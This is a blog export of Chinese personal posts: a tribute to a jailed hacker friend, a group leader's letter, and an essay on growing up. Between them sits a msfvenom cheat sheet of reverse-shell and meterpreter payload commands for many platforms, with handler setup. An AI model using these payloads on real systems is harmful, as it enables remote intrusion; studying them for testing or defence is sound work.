人才，思路好多了 ，技术也特别棒”我直接把他禁言了30分钟。我平时和他们闹着玩也就是玩玩权限禁言他们三四分钟，这次我真的比较生气，因为我想到了你。谁都知道，对于互联网来说时间意味这什么，不要说几年了，就算是两三个月都可能翻天。就说吧，以前谁能想到乌云这个漏洞提交的圣地会垮台，但是事情就是眼睁睁的发生在了网络中。更为重要的是，自由，对于一个正常人，一个20出头的少年意味着什么。我们不知道你在里面过的怎么样，有没有在深夜暗自悔恨当初。我们能为你做的只剩下闲时想起你的那一份心酸和难受。\n你失去联系的那段时间，我也因为工作的原因自己撤去了渗透吧主的身份，我也就是个副吧主，吧里少了我无关痛痒，反正我也是这么想的。所以渗透吧就剩下了老大一个人在管理，至于后来老大找来了谁谁谁。我就不了解了，也没时间去了解。留给我们的只剩下你在2016.6.6之前的回忆，或许等你回来渗透吧真的就变成了修水管渗透的贴吧了，毕竟现在连我都不愿意踏足那里了。你还记得我那时候闲下来时候，每天深夜给你们更新的恐怖小说《恐录》吗？那时候我也是一时冲动，在下班或则在深夜值班时候没事情做，突发奇想，想蛮写蛮写一本小说。故事的大致纲要和路线都在我的脑子里了，每天闲下来时候都会写上几百字甚至上千，只为了晚上给你们在“大风车”里更新给你们看，你还跟我说“给我安排一个好一点的角色”，我那时候就给你分配了一个保安的身份，后来还死了，哈哈哈。然后在你的恳求之下，我让“你”借尸还魂了，让你当了一个体育频道的主持人。其他人的角色身份也都是我一个一个安插上去的，当时小Y还在高三，看不了。我到了周末都会把一周更新的在全部发一遍出来，为了大伙，特别是“队长”的需求，我再忙，也会有想挤出时间去写这本书的冲动。后来自从你跟了狗蛋，在群里基本上我都看不到你的发言了，渐渐的大家对我的这本书的热情也淡了，加上自己的工作开始进入很忙的一段时间，就断更了。《恐录》这本书也胎死腹中，可能写了还不到一半。你以后要是想看也不会有了，说实话之前的剧情，你敢说不期待？以后你要是想看，说不定我会继续为了你和大伙重新开始规划，来一个《恐录2.0》也不一定哦。\n就在前两天我在知乎上看见了一个帖子“如何评价某某某安全团队的狗蛋”。这是一个匿名用户发出来的，大致的内容呢也就是拔了狗蛋的一些底子。“明面上的讲师，成功人士，年少有位，背地里面的疯狂黑产。出名事实上靠团队，很多文章漏洞，都是他团队里的人发现，他发出来而已。”大致上就是这些扒底的内容，在我看来，或许只有经历过事件的我们才知道到底狗蛋是个怎么样的人。在看到这个帖子的时候，怒的是我们整个“大风车”里的所有人。还在搞这一行的或许都不敢用真实的知乎ID发出自己的声音，都是匿名在该骂的骂该吹的吹。我和队长，两个毅然的站了出来，匿名个屁直接一顿狂喷狗蛋，我们最愤怒的话归纳起来，就呐喊一句“还我Bge！”当然，大肆称赞狗蛋的人一抓一大把，然而他们又知道什么呢。狗蛋自己也发文“所谓的一切喷词，都是那些匿名用户的欲加之罪，都是眼红。”难道，狗蛋自己在发出来的时候就不会有一丝的良心谴责吗。可笑，你今天所谓的成功，所谓的利益，难道不是牺牲了某些人的一切吗。匿名的人在喷狗蛋的人，我在这里替“大风车”和Bge谢谢你们。不管你们是不是知道真相，还是只是凑个热闹，人云亦云的扯上两句，我都要感谢你。而那些继续捧这狗蛋的人，我也不想说什么，如果有一天Bge的事情发生在你的周围，甚至是你的身上。我希望你在多年以后登录上自己的知乎帐号看看自己多年前可笑的言论。在这一刻我，真正的感觉到了鲁迅当时对中国的悲哀，他说“哪怕医学能拯救得了中国人孱弱的体质，也救不了国人麻木的精神。凡是愚弱的国民，即使体格如何健全，如何茁壮，也只能做毫无意义的示众的材料和看客，病死多少是不必以为不幸的。”。即使是在这虚拟的网络中，我也感同身受医学真的救不了国人，为了自己的利益，哪怕牺牲无数人的一切，那有如何。但是又能怎么样呢，我至少拥有良心和责任，我不会放弃继续治愈你们。\n我相信每个人所有经历过的朋友，包括曾经的、未来的、甚至失去的朋友，这一切都是命中注定好了的。和你们一样，回想起Bge和自己的一点点交集，感觉友谊虽然浅薄，但是我们都对彼此的流露过自己最真实的感情。我们一起疯狂过，一起互黑过，才有现在我在写此篇文章时候内心的五味杂陈。“想起那天夕阳下的奔跑，那是我们逝去的青春”，这是大风车的头像里的文字。从你离开到现在，直至以后，我们都不会去更改，因为我们怕你不认得回家的路。在这里还有一群在等待着你回来的伙伴，我们的聊天频道也一直替你留着一个位置。\n啊B，你知道你失联以后我们每次想你都干什么吗。我们会打开你的空间看看你的老照片，继续笑你这个猥琐b，可是这个笑却包含了我们满腔的辛酸。你空间里还保存着一张，也是唯一和队长的合影。那时候的队长相比于现在还开朗很多，不知道是随着时间的更迭，还是你的离开。仿佛一切都在变化，以前在我们看来无比珍重，无比渴望的事情，也在逐渐的消散，唯一不变的就是对你的哪一份念想。老朋友呀，我们无能为力呀，谁都没有想到当时在我们看起来是玩笑话的“查水表”有一天会发生在你的身上，条子也没有让你去喝个茶就回来了。真正应该被砍死的那个狗蛋，现在还在张狂的伪装着。自古说书唱戏劝人方，三条大道走中央。善恶到头终有报，人间正道是沧桑。他以为能这么无限的嚣张下去，踩着别人的未来和自由走向他的利益，开玩笑。\nBge你生活在我们当中，内心却自有你的一片天地，努力和钻研是你的标签，对未来十分好奇并且怀有憧憬，你从来没有放弃自己过自己的梦想，从你加入渗透吧开始，即使有点偏差，大目标依然都未曾改变过。或许你有很多的人生计划，有对未来生活的安排和渴望，也或许你准备了很多惊喜想提供给我们这些朋友，也想过给自己的家人一份温饱和幸福，可是这一切都还没来的及全部实现，你就在追梦的路上停下了脚步。我们永远都无法知道Bge你内心还有多少曾经设想甚至没来得及吐露的梦。我知道，比我们更加难受的是你的家人。一家人苦苦等待着你能够在完成学业后，假期归来，一家团聚吃顿饭。可是一切美满的进行中却被一个这辈子都被人唾骂的狗蛋所终结。其实，说到底还是你内心对完成梦想的过度渴望被狗蛋利用了。不过，Bge如果你现在看到的话，还是希望你能够重新开始自己新的生活，让你的爱，你的欣喜，淹没痛苦和委屈。在追梦的路上，你始终有我们“大风车”里的小伙伴们的陪同，梦想不会随风而去，他依然把握在你的手上。都说“哭过的眼看岁月更清楚”，我不清楚你在里面是否也曾为了自己暂时搁浅的梦眼角滑落泪水，但是心系你的亲人和朋友肯定为了流过泪。我们不希望，在数年后看到一个坠入深渊的LC，我们坚信来年的春天，花儿依然还会开放，那句迟到的“兄弟们，我Bge又回来了。”始终会来到，只不过来的有点慢，苦了我们这些等待已久的人。\n我写了这么久，虽然还有很多很多的话没有吐露出来，但是以上是我此时最想让你看到的。我们“大风车”永远是一个有爱的团体，你的回归永远不会迟到。他们也有很多想对你说的话，你也知道这些搞技术的并不是每一个都像我一样有写作这个天赋，能将自己的情感通过文字表达出来。但是真的不代表他们没有想法，我让他们尽量开心的表达一下，不要太煽情了。毕竟大家要一起快乐的走下去，不是吗？那么以下就是他们各自想对你说的话，也希望你能够看到。\n首先是“426”听说我要写这么一个关于Bge 的文，他说自己也有想说的，但是憋了半天，才憋了两个字。在他的记忆中，和你聊天第一句话就是“Bge”，“干嘛”，“草泥马”，然后每日成就（1/1）。但是，426 一直强调，你对他有恩。以下是他的原话：不知道是14年还是15年，有幸接触到渗透吧，也有幸加入了渗透吧新手集中营。不知道什么原因，突然被吧主拉入了大风车的群，也不知道这是不是一种缘分，能够跟着里面的各种朋友一起度过了这一年又一年。最开始在里面看见Bge，然而我叫他B哥，是因为他很多很多时候都会发自己正在学的东西到群里面，对于当时的我来说，都很高端，很不可及，所以我叫他B哥。Bge是个很不错的人，挺正直年轻的一个朋友，至少在我看来，他还是一个挺单纯很容易接触的。在刚入群的1年中，总是和B哥他们撕逼，一直到后来，请教过B哥几个问题，B哥也是知无不言，哪怕是很不能泄露的那种也都和我交流过，所以对B哥一直印象不错，毕竟是入群后第一个撕逼开玩笑的人。所以，我真的很想他。\nBge你猜猜下一个是谁，当然是那个我们的“小可爱”了，很让人高兴的是，现在他终于不是那个臭傻吊了，终于和自己喜欢很久的女神在一起了。不过为了女神的幸福，天天三餐吃饼，也成为了被我们鄙视的笑料。小可爱，在你出事以后真的可能是最不安的了，基本每天都在群里说想你。接下来也是他的原话，我也原封不动的发出来：Bge，NPLT，哈哈，又见面了，我是你的乘客，记不记得你每天给我开车了，我那段时间特别开心的呢！听说Bge的名字还是大姐和老大看直播给你起的呢，从一开始的不认识到老司机的过程是多么美好的一段回忆。我们每天的斗图，互黑，都是那么的美好，记不记得我给你买的细说PHP，我可是看着你从小白变成技术牛的过程，我每天傻不拉几的问你弱智的问题，你还一直给我解答，有什么新的发现也提前告诉我，我多么激动啊！看着你在我电脑上的360之行，多崇拜你。你为人也老实，对大家都挺好的，我曾经多么想和你见一面，现在想想真是后悔以前没见过你，现在暂时也没机会了，不过相信有一天我终究会找到你的，请你去大保健哈哈哈，请你吃大餐，你要好好的，要知道我们都在想你，欢迎你回来一起互黑，小司机在这里等老司机回来开车，等你，等你，等你。。。。\n然后是“iceH”，或许Bge你对他的印象是停留在这小子手机上有抢红包外挂，每次有人发红包，无论什么时间，他总是第一个抢到，然后屁都不放一个。但是他和你一样，都是一个懂奋斗，爱钻研都年轻小伙。在得知你的消息以后，也曾牵肠挂肚，也有一肚子的话想对你说：关于Bge吧，在我的映像中是个很逗而且乐于帮助他人的人。记得那时候刚进大风车，有许多问题的时候，问他的时候，他总是会很有耐心的帮忙解决。前段时间听说你进去了，起初我也没在意，以为你是有事没办法上QQ了。但渐渐的，发现你不发言了，也不装逼了，QQ达人也灭了，这个时候我开始慌了。每次看到大师智，就会想起你。愿你早日回归我们大风车这个家庭，我们全体成员等你回来。\n下一个是我们的“表姐”拉，最近她正在为了制作她的光立方和激光电子琴而绞尽脑汁呢。说起表姐，一个很喜欢写工具，动手能力十足，很有想法的小青年。你是否还记得她博客里自己制作的小游戏2048中还有你头像的小方块呢，你对应的是2048中的32，每次合成到32就能再次看到你那个装b 的头像了。表姐爱动漫，所以她的头像都是一些我也搞不清是什么的动漫角色，但是打开她的博客，你会发现，这扑面而来的还TM的还是动漫角色呀。不过这次我认识，那是可爱并且文武双全的土间埋，小埋（《干物妹！小埋》女主）。一个在家总是披着仓鼠斗篷，二头身，懒惰，任性的熊孩子形象。不过是个性格温柔并且头脑很好，无可挑剔的美少女高中生。Bge，你说实话，想不想找一个这样的女朋友……好了，接下来是表姐想对你说的原话哦：在我印象中，Bge是一个很逗逼又很爱装逼的人，在我知识浅薄的时候帮助我很多，也帮助过大风车很多人，在Bge那我学到了很多渗透知识（现在大多都忘了，2333~），我非常感谢Bge对我的帮助，很怀念Bge装逼的样子，告诉Bge表姐想他。我们在等你回来！\n我们的个人showtime大告白怎么能少了你的好基友“大师智”呢。这个坏小子，现在已经在某某某公司上班了，然而dog改不了吃屎，还是会在上班时间干点其他的屁事。“纠结的坏”这个名字曾经一度成为我们黑他的一个点，到底他在初中年少时候有多么的非主流才能起一个这样子骚气的名字，不得不说他年少时候一定有很多段不堪回首的往事。你们在一起搞事情的日子发生点点点滴滴或许也只有你们彼此懂，就让往事随风而去吧。Bge我知道你好强，没事，大师智这小子到现在还是单身呢，你那么帅分分钟撩一个哪有什么问题。好了，下面是他给你的原话：Bge嘛，嘿嘿嘿。我依然还记得那个中午，临上课前帮Bge提权的事，记得上面有狗，加不上账户，只能修改密码了。不过厚道的我当然没有这么做了，只是把方法告诉了碧哥。从此我们也就一起坐上了友谊的小船。还有就是开语音的时候，那一口“标准”的普通话，用四川话来说，你就是个蛤蟆皮。再然后，就是那段时间，好几次直播被打脸，233333.最后的最后，许久不见，不知你可好，我永远一直都会在大风车等你！\n还记得那个身处高中牢笼之中，依然在周末捣腾他钟爱都渗透的小Y吗。没错哦，现在他也考上了自己心仪的大学满意的专业。我和小Y认识的真的很早，他真的是我在认识你之前，我认为最努力和最勇于去追梦的小伙子。虽然我在认识你之后还是觉得他最有潜力，哈哈哈。和你一样，爱钻研不放弃也是他的标签，不过，仔细想想，我们大风车里的哪一个人又不是这样呢。“总有一天我们为之奋斗和努力的目标，会反过来拥抱我们。”这是我们这一波人始终坚信的真理。当然了，我们的小Y也有许多想对你说的：\n[To our Bge：不知不觉，你也已经消失联系好几个月了！不知道何时能见到你那头像闪烁在我的列表中 ！哎！\nBge，我和你虽然不太熟，但也算是一起玩过的朋友。大家都相识在我们曾经的“大风车”中！那个时候的你，与我们扯淡，与我们共同进步，与我们一起有说有笑 ！但现在都已经是过去时了！我不得不感叹物是人非啊！\n遇到狗蛋是你这个人生中，可谓最大的转折点。把你捧到了你的巅峰，然而却不知道交友不慎的后果居然有如此之大！想起你的牢狱之灾我就不断叹息，真的第一次知道时心里一震，就像缺了什么似得，很不安生。\n【属于你的回报】\n遇到狗蛋后，据我了解，你们关系真的很不错。就是因为你的你热于助人，而狗蛋呢，他来者不拒（先不谈论关于狗蛋）所以自然而然玩得不错。你为他做了很多事情，你们一起日高权的站。随着你的技术与名声越来越大，圈子里的人了知道“狗蛋”还有你这个朋友“NPLT”，这是外人对你的尊称。在接下来的这年，你为他论坛录制视频，操心不少。在补天的团队获奖被邀去京，你当之无愧的作为代表人去了。你知道当时我们有多么的羡慕你能站上那个舞台，见识这么大场面，可以说现在我的目标之一，还是可以获此殊荣 。\n我依然记得那天的颁奖直播，我看到了羞涩的Bge， 紧张的在颁奖现场，我们一群人看着直播，夸着这么帅气的你，看着这么高大的你。哎！肯定这段日子也是你最开心的时候了，但是接下来……\n【谁也想不到的遭遇】\n终于到了最悲伤的阶段。你与他的关系与日俱增，越来越好。却不知道为他扛得锅越来越多 ，可是你却没有看清楚他在利用你们（此处省略甲乙丙）扩大自己的名气。\n但是我失策了，我真的失策了！我知道他干的勾当，我也知道他有后台。但是我不知道，在你，这个与他玩了日日夜夜的，我们的Bge出事的时候，他没有选择保你。他为了自己的利益，完全没有考虑过你，甚至现在依然逍遥，没有半点悔意。我到现在都没有看到他发过任何感慨，就像无所谓似得 ？ WTF “你还我们的Bge！”\n事已至此，说什么也没用了。你遭遇此难，也算是不公平的老天给你的试炼，但是我们依然痛心。\n其他没什么，我相信你一定能挺过来，我们会等着你回来的 ！\n\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-致我们的永远的Bge ]\n不知道Bge你看到这里，面对大伙的真情流露是否已经内牛满面，至少也应该明白了自己不寂寞了吧。当然了，我们的大风车里还有一个不会尬舞的“魔法天女”—队长！现在我也忘记了，队长这个名字是从何而来的了，但是这个来自中国传媒大学的少女总是能给我们的平静的生活带来一点刺激和多彩。我不管她现在是那个穿着破裤子还让外婆缝的大姑娘，还是开着狂拽酷炫屌炸天摩托车的狂野女郎。“队长”这两个字，和你Bge一样，都和我们大风车牢牢地挂勾在了一起。替你抱不平的是她，替你呐喊的也总是她。你空间还保留着和她的那张酷酷的合照，也是她每次想你时候可以看看的地方。或许“队长”坚韧的心让她不会替你哭泣，但是她却有无数的话想对你诉说：（由于队长暂时出去玩了，没把想说的发给我，二改必然补上，尽请期待！）\n最后想对你两句的当然还有我们的老大了，毕竟boss总是压轴出场的。回想起每次我和老大出去吃饭，谈论到你，剩下的也只有惋惜。现在老大工作忙了加上有了家庭，也没有太多的时间和我们在“大风车”里愉快的玩耍了，但是他还是总出现在我们最需要帮助的时候。当我们遇到瓶颈的时候，他的一两句指点，往往就能让我们遇到问题迎刃而解。老大话不多，但是句句精辟，他想对你说的就一句话：“唉！成天骂人傻逼最后自己当了傻逼。”或许，这句话看似好笑，但是却包含了老大对你的惋惜和意味深长。人生如棋，一步走错了，满盘皆输？我看未必，命运始终是把握在自己的手上，即使是失去一切也不意味着缺憾，何况你还没有失去一切，你至少还剩下等待你回来的亲人和我们这一群朋友，难道不是吗？\n大风车里还有一些小伙伴有很多话想对你说的，但是由于工作的忙碌，无法表达。我也替他们将千言万语汇成一句话：Bge，大风车永远是你的家，等你回来！\n","date":"2016-10-29T16:12:31Z","image":"https://w.wallhaven.cc/full/9d/wallhaven-9d9jmx.jpg","permalink":"https://360rce.github.io/p/w7tu78z2/","title":"大风车全体成员写给Bge，只为你有一天可以看到。等你归来"},{"content":"Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.\nList payloads\nmsfvenom -l\nOs Payloads: Linux\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f elf \u0026gt; shell.elf\nWindows\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f exe \u0026gt; shell.exe\nMac\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f macho \u0026gt; shell.macho\nWeb Payloads： PHP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f raw \u0026gt; shell.php cat shell.php | pbcopy \u0026amp;\u0026amp; echo '\u0026lt;?php ' | tr -d '\\n' \u0026gt; shell.php \u0026amp;\u0026amp; pbpaste \u0026gt;\u0026gt; shell.php\nASP\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f asp \u0026gt; shell.asp\nJSP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f raw \u0026gt; shell.jsp\nWAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f war \u0026gt; shell.war\nScripting Payloads: Python\nmsfvenom -p cmd/unix/reverse_python LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f raw \u0026gt; shell.py\nBash\nmsfvenom -p cmd/unix/reverse_bash LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f raw \u0026gt; shell.sh\nPerl\nmsfvenom -p cmd/unix/reverse_perl LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f raw \u0026gt; shell.pl\nShellcode: For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.\nLinux Based Shellcode\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f \u0026lt;language\u0026gt;\nWindows Based Shellcode\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f \u0026lt;language\u0026gt;\nMac Based Shellcode\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f \u0026lt;language\u0026gt;\nHandlers： Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.\nuse exploit/multi/handler set PAYLOAD \u0026lt;Payload name\u0026gt; set LHOST \u0026lt;LHOST value\u0026gt; set LPORT \u0026lt;LPORT value\u0026gt; set ExitOnSession false exploit -j -z\nOnce the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘\n","date":"2016-10-22T16:45:50Z","image":"https://w.wallhaven.cc/full/l8/wallhaven-l8jl2p.jpg","permalink":"https://360rce.github.io/p/6zc1968c/","title":"msf的各种生成payload命令"},{"content":"原文: 我今年23岁，毕业两年，做过运维，做过安全，做过手机，也做过黑产。 会web渗透，会脚本语言，会Windows/Linux底层安全运维，会安卓框架 爱跑步，爱极限运动，爱计算机，爱网络。\n21岁，刚刚出来工作，之前做黑产积累了一点资本，一通公安的电话，我成了什么都没有的应届找工作的大学生。\n我去过智联招聘当服务器运维技术员，去过智联安防做过网络安全总监，最后在机锋网当了一名第三方rom框架组组长。我跑过手机发布会，待过线下座谈会，也低着头去大公司帮忙做安全，和两年前相似，我又有了一点在这个社会上活下来的需要的最重要的东西。\n今年5月，我父亲退休了，我和我女朋友准备结婚了，6月3号，我们领证了。7月11日，我们办了订婚宴，10月28号，我们本该结婚了，家里出事了。两年累计下来的资本，又化为泡影。这次，现在不是什么都没有，是我欠了别人许多许多。\n她说，没有关系，什么时候办婚宴都可以，先把事情解决了。 我向机锋预支了4个月工资加所有奖金，经理同意了。他说，360你去不了了，除非你能把这4个月该做的，在1月份前完成，现在，快了。 进入社会，快3年了，可能这些跟真正大起大落的人比不算什么，可是我真的累。\n穷途末路，没有地方借钱，我试着在网络上找那些朋友帮忙，可是，他们不认识我了，一个都不认识了。我无心组建的一个QQ群，他叫大风车，随意打的名字。里面除了学生，还是学生，根本就没有见过面的人。可是他们却帮我了，虽然还不足凤毛麟角，可是他们确实帮了我。现在稍微缓和了一点，可是事还没有解决，不过他们已经帮了我最多最多了。 今晚的事还没有做完，很累，只能不停的点烟提神，突然看到那个图标，想起那天夕阳下的奔跑。我想说点话，也想找个地方把我的累说出来，还想对大风车的人说点话，虽然有二十来个人，可是，我却只记得这几个。\n小Y： 其实你刚刚进来的时候，我记得是一个钻阔，是不是你我还真想不起来了，那时候大风车人也多，大家不停的嘲讽，可是你却没有发飙，只是不停的说那是以前不懂，现在要学习技术。现在大风车那么团结了，我也看到你的成长，你的好学，你的努力，也在我困难的时候给了大风车这个集体给予我最大的帮助，真要送你一个祝福，我希望你考上自己喜欢的大学，喜欢的专业。再找一个女朋友，哪天你可以和我说，老大，我找到女朋友了。\n大师智： 什么时候开始这么叫你的，具体哪天想不起来了，只记得我很喜欢一个游戏解说叫小智，他那天上了大师在直播，于是你说你自己是大师智，就一直这样叫着了。我时常黑你，怎么黑好玩就怎么来，你也别生气，尊敬是留给陌生人的，好朋友才互相黑着玩的你说对吧。你太懒了，找点时间给自己补点墨水，虽然大风车是一个朋友的集体，可我的初衷是培养一些人。\n碧哥： 同样也是叫大师智开始，这么叫你的。你很逗比，我很喜欢这样乐观的人，我完全看不到你的成长，我感觉你遇到95后突然一下子变成一个人人喊大牛的碧哥，可是你几斤几两现在好像能摸的清楚，别膨胀，你总有真正是大牛的一天，还有，快找个女朋友，天天用大师智送的娃娃，容易漏气。\n表哥： 是不是现在都流行叫哥了啊，碧哥就算了还有个表哥。希望你做你想做的，以后如果公司缺运维，我第一个推荐你，问题尽管向我问，我真看不见，你抖我一下都成。 表姐： 刚刚说要表哥就说表姐了，也许你现在在题海，看不见，我也希望你和小Y一样，考上自己想去的大学。\n土豆： 你是大风车的老人了，我对你的印象是沉默寡言的人，一个问题爱一直研究的人，或许你不是，只是不经常出现了，记忆中你是工作了吧，忙了就很难顾及到别的了，一起为了生活拼搏吧！\njame_xhs： 妈的你这名字也太长了，就不能有一个朗朗上口的称呼吗。我们有共同的爱好，我们都喜欢手机，喜欢他的外观工艺，喜欢他的软件系统，能找到一个同爱好的人，本来就是人生中一件难得的事，多冒泡，大风车是一个大家庭，每个人的关系都应该一样，每一个话题大家都应该能一起说。加油！\n95： 和你认识的时间不长，不过也谢谢你信得过我，也谢谢你帮过我，我们目前的状态一样，你为梦想拼，我为生活拼，都是拼搏。一月份，我给你一个sss团队核心该有的样子，给你一个sss团队讲师该有的进度，共勉！\n疯子： 我对你没有什么印象，不过在我困难的时候QQ私聊我需要帮助吗，现在还是很感激你的，真的，我对你没有什么印象，只知道你是大风车群里的一员，也知道你喜欢健身，我一直希望大风车是一个大家都是好朋友的地方，虽然只是网络，可能虚无缥缈，可是朋友缺不是虚无缥缈的东西。\n小可爱： 我一直觉得你是一个很有想法的人，总感觉你和同龄人不一样，也很努力，我一直觉得当初我学习技术的时候已经很努力了，可是我做不到晚上12点睡第二天7点就可以起来看php，不管是不是一时而起的干劲，他都是你努力的象征，同样的，我也希望你的生活好一点，至少比我好，不是一点，是很多。\niceH： 我告诉你，你这个名字太low了。我不记得怎么加的你，还是你加的我，只记得你混迹在许多的娱乐圈里面，动不动就什么黑客精神的娱乐圈，还爱邀请我，那时候真的烦。不过你现在好像有一点转变，有没有混迹我不知道，至少没有对我进行邀群DDOS了，你需要改变的是技术，技术好了，你邀请我进黄色直播群我都不在意。\n虫二： 感谢你在努力适应大风车，每一个后来进入大风车的人都希望能学好技术，不过可能让你失望了，还真没学到，我忙到没有时间教你们，偶尔有时间还尽和大家扯蛋，别怪我，进了大风车就是好朋友，好朋友的知识总会分享给你的。\n小队长： 别生气你是最后一个，主角都是最后出场的，也别问大姐呢？这是我写给大风车的人，大姐是我穿一条内裤长大的兄弟，有什么心里话，我会直接对他说。你是集体里面唯一的女孩，也是我最疼的妹妹，我可以黑任何人，就是不会黑你，任何人也不可以黑你，大师智敢欺负你，我第一个剁他的猪屌，我希望你开开心心的，活好每一天，你有什么要求，我能做到的，尽量做，晚上早点睡，女孩的皮肤和身体很重要的，我很爱听你和我倾诉你的生活，也谢谢你可以听我生活的辛苦。你一直是最漂亮可爱的，谁说不是，和大师智一样，把他挂树上剁屌。大风车一开始是一个技术的集合，可是却意外成为一个大家庭，可是我不忘初衷，一直希望你们学好技术，你不同，你的任务就是卖萌打扮，做自己开心想做的事，哪天找到你爱的人，爱你的人，别把我这个老大忘记了。\n这一直是我想对你们说的心里话，可能有点心灵鸡汤了，好像这不是那个天天爱开玩笑没事讲几个黄段子的我了，不过我还是觉得，网络不是友谊的鸿沟，是好朋友就是好朋友，哪来那么多别的事，见不见过又怎样，是否了解又怎样，至少我们聊起天来很开心。差不多了，点根烟，继续把没做完的事做完。\n谢谢你们听我说心里话，谢谢你们能了解我，谢谢你们叫我老大。\n——永远旋转的大风车\n","date":"2015-11-21T22:25:10Z","image":"https://w.wallhaven.cc/full/kx/wallhaven-kxdrdq.jpg","permalink":"https://360rce.github.io/p/0gm3s911/","title":"我想说的话，我的大风车"},{"content":"我们都成了大人，不是原来打打闹闹了，不管做什么，都牵扯到钱，牵扯到自己身边的人安全与否。狐朋狗友多了，真正的兄弟少了，以前的同学也不联系了，会打架，会和父母吵架，在家里也不经常和家里人说话了，不再像小时候腻着爸妈，和父母的关系越来越差，晚上睡觉的时候，想到之前父母那严厉的面容，枕头上总会湿一片。\n我们都成了大人，都有了自己的梦想，有了自己的理想，原本无趣的生活有了一丝乐趣。为了自己的理想在拼搏，在努力，在学习。可能父母的不理解，总是阻碍我们。这不怪他们，他们只是为了我们好。\n我们都成了大人，开始越来越愁眉苦脸，每天维持着烦恼。为了理想努力而遇到瓶颈，生活的劳累奔波，甚至头发的长度，鞋子的颜色都成了我们所要烦恼的事情。压力大了，身边的人不再问你考了多少分，而是问成就怎么样，快毕业了准备去哪里就业，哪所重点高中的，哪所名牌大学的，哪所大公司的。\n我们都成了大人，开始各种故事一连串的出现在我们生活中，有好的，有坏的。有爱我的人，有伤害过我的人，被这个鸡巴社会弄的现实的我们，都已经是大人了。成长的路总是有挫折，而我们的这个年龄，似乎已经被各种困难，各种挫折弄的麻木了。小时候的同情心似乎越来越不见了，见到街上的什么破产大学生，断了条胳膊就出来乞讨的人，不会像小时候那么同情他们，甚至翻出口袋仅有的几块零花钱毫不心疼的扔进他们的碗里、包里。现在的我们，总会想很多。管我屁事？自己的搞不定自己还去管别人？破产？你有胳膊右腿有脑袋你不会去找事情做？至少养活自己，放下尊严来乞讨？你他妈还是个人？断条胳膊就不能干事了？收破烂都比这个强。成了大人的我们，发现自己想的更多了，是福是祸？\n我们都成了大人，我们知道了，在生活面前，一切挫折和困难都不残酷，看重的是过程而不是结局，只要活着，有着尊严，那些都不算什么。我们都感谢那些伤害过，爱过我们的人，我们会感谢那首让我们振作、感动流涕的歌。\n一眨眼，时间不等人，我们都成了那小时候崇拜，期盼，那所谓的大人。\n","date":"2015-01-02T11:06:53Z","image":"https://w.wallhaven.cc/full/jx/wallhaven-jxdw7p.jpg","permalink":"https://360rce.github.io/p/6gcb63pr/","title":"我们都长大了"}]